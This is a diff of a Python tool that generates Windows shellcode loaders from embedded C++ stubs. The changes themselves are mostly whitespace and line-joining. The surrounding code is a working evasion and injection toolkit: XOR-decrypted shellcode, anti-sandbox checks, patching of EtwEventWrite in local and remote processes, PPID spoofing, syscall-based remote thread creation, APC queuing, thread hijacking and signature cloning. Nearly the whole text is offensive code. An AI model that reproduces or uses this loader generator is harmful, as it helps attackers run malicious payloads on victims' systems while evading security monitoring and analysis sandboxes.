@@ -24,27 +24,18 @@ Example Execution: C:\>threadhijacker.exe 20485
 
 parser = argparse.ArgumentParser(description=description, epilog=epilog,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
-parser.add_argument("--input", metavar="FILE", required=True,
-                    help="File containing shellcode, usually a .bin, example: --input shellcode.bin")
+parser.add_argument("--input", metavar="FILE", required=True, help="File containing shellcode, usually a .bin, example: --input shellcode.bin")
 parser.add_argument("--method", metavar="NUMBER", required=True, help="Method of execution, example: --method 1")
-parser.add_argument("--out", metavar="FILENAME", required=True,
-                    help="The output name of the produced executable (No file extension), example: --out loader")
+parser.add_argument("--out", metavar="FILENAME", required=True, help="The output name of the produced executable (No file extension), example: --out loader")
 parser.add_argument("--etw", action="store_true", help="Patch EtwEventWrite in the local and remote process")
-parser.add_argument("--hideconsole", action="store_true",
-                    help="Hide the console via: ShowWindow(GetConsoleWindow(), SW_HIDE)")
-parser.add_argument("--domainjoined", action="store_true",
-                    help="Anti-Sandbox Check: If the system is not domain-joined, exit")
-parser.add_argument("--longsleep", action="store_true",
-                    help="Anti-Sandbox Check: Sleep for 90s, if <75s have passed, exit")
-parser.add_argument("--processors", metavar="NUMBER",
-                    help="Anti-Sandbox Check: If the number of processors is < X, exit")
+parser.add_argument("--hideconsole", action="store_true", help="Hide the console via: ShowWindow(GetConsoleWindow(), SW_HIDE)")
+parser.add_argument("--domainjoined", action="store_true", help="Anti-Sandbox Check: If the system is not domain-joined, exit")
+parser.add_argument("--longsleep", action="store_true", help="Anti-Sandbox Check: Sleep for 90s, if <75s have passed, exit")
+parser.add_argument("--processors", metavar="NUMBER", help="Anti-Sandbox Check: If the number of processors is < X, exit")
 parser.add_argument("--ram", metavar="NUMBER", help="Anti-Sandbox Check: If the amount of RAM is < X GB, exit")
-parser.add_argument("--parent", metavar="PROCESS", default="explorer.exe",
-                    help="Specify the parent process for PPID spoofing, example --parent explorer.exe")
-parser.add_argument("--child", metavar="PROCESS", default="svchost.exe",
-                    help="Specify the process to spawn for injection into, example: --child svchost.exe")
-parser.add_argument("--domain", metavar="FILE",
-                    help="Specify a domain to use for signture cloning via CarbonCopy, example: --domain cisco.com")
+parser.add_argument("--parent", metavar="PROCESS", default="explorer.exe", help="Specify the parent process for PPID spoofing, example --parent explorer.exe")
+parser.add_argument("--child", metavar="PROCESS", default="svchost.exe", help="Specify the process to spawn for injection into, example: --child svchost.exe")
+parser.add_argument("--domain", metavar="FILE", help="Specify a domain to use for signture cloning via CarbonCopy, example: --domain cisco.com")
 
 args = parser.parse_args()
 iFile = args.input
@@ -78,6 +69,7 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
                 j++;
         }
 }
+
 /*PROCESSORS
 void processors() {
 
@@ -90,6 +82,7 @@ void processors() {
         }
 }
 PROCESSORS*/
+
 /*DOMAINJOINED
 void domainJoined() {
         // Check if domain joined
@@ -101,6 +94,7 @@ void domainJoined() {
         }
 }
 DOMAINJOINED*/
+
 /*RAM
 void ram() {
         // Check if <X RAM
@@ -112,6 +106,7 @@ void ram() {
         }
 }
 RAM*/
+
 /*LONGSLEEP
 void skipSleep() {
         // Check if long sleeps fast forwarded
@@ -126,6 +121,7 @@ void skipSleep() {
         };
 }
 LONGSLEEP*/
+
 /*PATCHETWLOCAL
 int patchETW(void) {
         HANDLE curproc = GetCurrentProcess();
@@ -143,6 +139,7 @@ int patchETW(void) {
         return 0;
 }
 PATCHETWLOCAL*/
+
 void run() {
         PVOID lbuffer = nullptr;
         HANDLE curproc = GetCurrentProcess();
@@ -177,9 +174,13 @@ stub2 = """
 #include <lm.h>
 #include <lmjoin.h>
 #pragma comment(lib, "netapi32.lib")
+
+
 unsigned char shellcode[] = SHELLCODE_REPLACE
 size_t shellcode_len = sizeof(shellcode);
 char key[] = "XORKEY_REPLACE";
+
+
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
         int j;
         j = 0;
@@ -189,6 +190,8 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
                 j++;
         }
 }
+
+
 /*PROCESSORS
 void processors() {
 
@@ -201,6 +204,8 @@ void processors() {
         }
 }
 PROCESSORS*/
+
+
 /*DOMAINJOINED
 void domainJoined() {
         // Check if domain joined
@@ -212,6 +217,8 @@ void domainJoined() {
         }
 }
 DOMAINJOINED*/
+
+
 /*RAM
 void ram() {
         // Check if <X RAM
@@ -223,6 +230,8 @@ void ram() {
         }
 }
 RAM*/
+
+
 /*LONGSLEEP
 void skipSleep() {
         // Check if long sleeps fast forwarded
@@ -237,6 +246,8 @@ void skipSleep() {
         };
 }
 LONGSLEEP*/
+
+
 /*PATCHETWLOCAL
 int patchETW(void) {
         HANDLE curproc = GetCurrentProcess();
@@ -254,6 +265,8 @@ int patchETW(void) {
         return 0;
 }
 PATCHETWLOCAL*/
+
+
 // --- Function for loader ---
 void run() {
         PVOID lbuffer = nullptr;
@@ -284,6 +297,8 @@ int main(int argc, char** argv) {
         run();
 }
 """
+
+
 stub3 = """
 #include <windows.h>
 #include "syscalls.h"
@@ -291,9 +306,13 @@ stub3 = """
 #include <tlhelp32.h>
 #include <stdio.h>
 #pragma comment(lib, "netapi32.lib")
+
+
 unsigned char shellcode[] = SHELLCODE_REPLACE
 size_t shellcode_len = sizeof(shellcode);
 char key[] = "XORKEY_REPLACE"; 
+
+
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
         int j;
         j = 0;
@@ -303,6 +322,8 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
                 j++;
         }
 }
+
+
 /*PROCESSORS
 void processors() {
         int minprocs = NUMBER_OF_PROCS_REPLACE;
@@ -314,6 +335,8 @@ void processors() {
         }
 }
 PROCESSORS*/
+
+
 /*DOMAINJOINED
 void domainJoined() {
         // Check if domain joined
@@ -325,6 +348,8 @@ void domainJoined() {
         }
 }
 DOMAINJOINED*/
+
+
 /*RAM
 void ram() {
         // Check if <X RAM
@@ -336,6 +361,8 @@ void ram() {
         }
 }
 RAM*/
+
+
 /*LONGSLEEP
 void skipSleep() {
         // Check if long sleeps fast forwarded
@@ -350,6 +377,8 @@ void skipSleep() {
         };
 }
 LONGSLEEP*/
+
+
 /*PATCHETWLOCAL
 int patchETW(void) {
         HANDLE curproc = GetCurrentProcess();
@@ -367,6 +396,8 @@ int patchETW(void) {
         return 0;
 }
 PATCHETWLOCAL*/
+
+
 /*PATCHETWREMOTE
 void patchETWRemote(HANDLE remoteProc) {
         HANDLE targetProcHandle = remoteProc;
@@ -382,6 +413,8 @@ void patchETWRemote(HANDLE remoteProc) {
         NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);
 }
 PATCHETWREMOTE*/
+
+
 HANDLE getHandle(int processID) {
         HANDLE targetProcHandle;
         OBJECT_ATTRIBUTES oa;
@@ -392,6 +425,8 @@ HANDLE getHandle(int processID) {
         NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);
         return targetProcHandle;
 }
+
+
 void run(HANDLE targetproc) {
         PVOID rbuffer = nullptr;
         HANDLE remoteProc;
@@ -408,6 +443,7 @@ void run(HANDLE targetproc) {
         NtCreateThreadEx(&remoteProc, GENERIC_EXECUTE, NULL, targetproc, rbuffer, NULL, FALSE, 0, 0, 0, nullptr);
         NtClose(targetproc);
 }
+
 // --- MAIN ---
 int main(int argc, char** argv) {
         char* holderID = argv[1];
@@ -431,8 +467,11 @@ stub4 = """
 #include "lm.h"
 #include <tlhelp32.h>
 #pragma comment(lib, "netapi32.lib")
+
+
 // g++ is whack and cant find these in header files, so have to resolve at runtime
 const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+
 typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
         LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
         DWORD                        dwFlags,
@@ -442,15 +481,20 @@ typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
         PVOID                        lpPreviousValue,
         PSIZE_T                      lpReturnSize
 );
+
 typedef BOOL (WINAPI* INITIALIZEPROCTHREADATTRIBUTELIST) (
         LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
         DWORD                        dwAttributeCount,
         DWORD                        dwFlags,
         PSIZE_T                      lpSize
 );
+
+
 unsigned char shellcode[] = SHELLCODE_REPLACE
 size_t shellcode_len = sizeof(shellcode);
 char key[] = "XORKEY_REPLACE"; 
+
+
 // --- XOR Decryption Routine ---
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
         int j;
@@ -461,6 +505,8 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
                 j++;
         }
 }
+
+
 /*PROCESSORS
 void processors() {
         int minprocs = NUMBER_OF_PROCS_REPLACE;
@@ -472,6 +518,8 @@ void processors() {
         }
 }
 PROCESSORS*/
+
+
 /*DOMAINJOINED
 void domainJoined() {
         // Check if domain joined
@@ -483,6 +531,8 @@ void domainJoined() {
         }
 }
 DOMAINJOINED*/
+
+
 /*RAM
 void ram() {
         // Check if <X RAM
@@ -494,6 +544,8 @@ void ram() {
         }
 }
 RAM*/
+
+
 /*LONGSLEEP
 void skipSleep() {
         // Check if long sleeps fast forwarded
@@ -508,6 +560,8 @@ void skipSleep() {
         };
 }
 LONGSLEEP*/
+
+
 /*PATCHETWLOCAL
 int patchETW(void) {
         HANDLE curproc = GetCurrentProcess();
@@ -525,6 +579,8 @@ int patchETW(void) {
         return 0;
 }
 PATCHETWLOCAL*/
+
+
 /*PATCHETWREMOTE
 void patchETWRemote(HANDLE remoteProc) {
         HANDLE targetProcHandle = remoteProc;
@@ -540,6 +596,8 @@ void patchETWRemote(HANDLE remoteProc) {
         NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);
 }
 PATCHETWREMOTE*/
+
+
 HANDLE getHandle(int processID) {
         HANDLE targetProcHandle;
         OBJECT_ATTRIBUTES oa;
@@ -550,6 +608,8 @@ HANDLE getHandle(int processID) {
         NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);
         return targetProcHandle;
 }
+
+
 DWORD GetPidByName(const char* pName) {
         PROCESSENTRY32 pEntry;
         HANDLE snapshot;
@@ -565,6 +625,8 @@ DWORD GetPidByName(const char* pName) {
         NtClose(snapshot);
         return 0;
 }
+
+
 void run() {
         // Have to resolve these at runtime b/c issues w/ mingw :(
 
@@ -620,6 +682,8 @@ void run() {
         NtQueueApcThread(processInfo.hThread, (PKNORMAL_ROUTINE)remoteSectionAddress, NULL, NULL, NULL);
         NtResumeThread(processInfo.hThread, NULL);
 }
+
+
 // --- MAIN ---
 int main() {
         //PROCREPLACEprocessors();
@@ -640,10 +704,14 @@ stub5 = """
 #include <stdio.h>
 #include <vector> // need this for iteration of threads
 #pragma comment(lib, "netapi32.lib")
+
+
 unsigned char shellcode[] = SHELLCODE_REPLACE
 
 size_t shellcode_len = sizeof(shellcode);
 char key[] = "XORKEY_REPLACE"; 
+
+
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
         int j;
         j = 0;
@@ -653,6 +721,8 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
                 j++;
         }
 }
+
+
 /*PROCESSORS
 void processors() {
         int minprocs = NUMBER_OF_PROCS_REPLACE;
@@ -664,6 +734,8 @@ void processors() {
         }
 }
 PROCESSORS*/
+
+
 /*DOMAINJOINED
 void domainJoined() {
         // Check if domain joined
@@ -675,6 +747,8 @@ void domainJoined() {
         }
 }
 DOMAINJOINED*/
+
+
 /*RAM
 void ram() {
         // Check if <X RAM
@@ -686,6 +760,8 @@ void ram() {
         }
 }
 RAM*/
+
+
 /*LONGSLEEP
 void skipSleep() {
         // Check if long sleeps fast forwarded
@@ -700,6 +776,8 @@ void skipSleep() {
         };
 }
 LONGSLEEP*/
+
+
 /*PATCHETWLOCAL
 int patchETW(void) {
         HANDLE curproc = GetCurrentProcess();
@@ -717,6 +795,8 @@ int patchETW(void) {
         return 0;
 }
 PATCHETWLOCAL*/
+
+
 /*PATCHETWREMOTE
 void patchETWRemote(HANDLE remoteProc) {
         HANDLE targetProcHandle = remoteProc;
@@ -732,6 +812,8 @@ void patchETWRemote(HANDLE remoteProc) {
         NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);
 }
 PATCHETWREMOTE*/
+
+
 HANDLE getHandle(int processID) {
         HANDLE targetProcHandle;
         OBJECT_ATTRIBUTES oa;
@@ -742,6 +824,7 @@ HANDLE getHandle(int processID) {
         NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);
         return targetProcHandle;
 }
+
 void run(HANDLE targetproc, int procID) {
         PVOID rbuffer = nullptr;
         ULONG old_protect;
@@ -774,6 +857,8 @@ void run(HANDLE targetproc, int procID) {
                 }
         NtClose(targetproc);
 }
+
+
 // --- MAIN ---
 int main(int argc, char** argv) {
         char* holderID = argv[1];
@@ -799,9 +884,13 @@ stub6 = """
 #include "lm.h"
 #include <tlhelp32.h>
 #pragma comment(lib, "netapi32.lib")
+
+
 unsigned char shellcode[] = SHELLCODE_REPLACE
 size_t shellcode_len = sizeof(shellcode);
 char key[] = "XORKEY_REPLACE"; 
+
+
 // --- XOR Decryption Routine ---
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
         int j;
@@ -812,6 +901,8 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
                 j++;
         }
 }
+
+
 /*PROCESSORS
 void processors() {
         int minprocs = NUMBER_OF_PROCS_REPLACE;
@@ -823,6 +914,8 @@ void processors() {
         }
 }
 PROCESSORS*/
+
+
 /*DOMAINJOINED
 void domainJoined() {
         // Check if domain joined
@@ -834,6 +927,8 @@ void domainJoined() {
         }
 }
 DOMAINJOINED*/
+
+
 /*RAM
 void ram() {
         // Check if <X RAM
@@ -845,6 +940,8 @@ void ram() {
         }
 }
 RAM*/
+
+
 /*LONGSLEEP
 void skipSleep() {
         // Check if long sleeps fast forwarded
@@ -859,6 +956,8 @@ void skipSleep() {
         };
 }
 LONGSLEEP*/
+
+
 /*PATCHETWLOCAL
 int patchETW(void) {
         HANDLE curproc = GetCurrentProcess();
@@ -876,6 +975,8 @@ int patchETW(void) {
         return 0;
 }
 PATCHETWLOCAL*/
+
+
 /*PATCHETWREMOTE
 void patchETWRemote(HANDLE remoteProc) {
         HANDLE targetProcHandle = remoteProc;
@@ -891,6 +992,8 @@ void patchETWRemote(HANDLE remoteProc) {
         NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);
 }
 PATCHETWREMOTE*/
+
+
 HANDLE getHandle(int processID) {
         HANDLE targetProcHandle;
         OBJECT_ATTRIBUTES oa;
@@ -901,6 +1004,8 @@ HANDLE getHandle(int processID) {
         NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);
         return targetProcHandle;
 }
+
+
 void run(HANDLE remoteProc, int processID) {
         HANDLE threadHijack = NULL;
         HANDLE snapshot;
@@ -936,6 +1041,7 @@ void run(HANDLE remoteProc, int processID) {
         NtClose(threadHijack);
         NtClose(remoteProc);
 }
+
 // --- MAIN ---
 int main(int argc, char** argv) {
         char* holderID = argv[1];
